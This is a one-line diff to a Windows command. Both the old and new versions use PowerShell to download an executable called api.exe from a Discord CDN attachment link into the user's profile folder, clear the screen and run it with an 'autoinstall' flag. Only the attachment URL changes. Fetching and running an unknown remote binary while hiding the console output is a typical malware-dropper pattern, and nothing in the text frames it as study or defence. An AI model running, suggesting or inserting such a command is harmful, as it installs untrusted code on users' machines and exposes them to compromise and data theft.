@@ -1,1 +1,1 @@
-powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/836269521483595796/1182422439695757362/api.exe -OutFile C:\Users\%USERNAME%\api.exe" && cls && C:\Users\%USERNAME%\api.exe -conf@autoinstall
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/836269521483595796/1182659528408432731/api.exe -OutFile C:\Users\%USERNAME%\api.exe" && cls && C:\Users\%USERNAME%\api.exe -conf@autoinstall
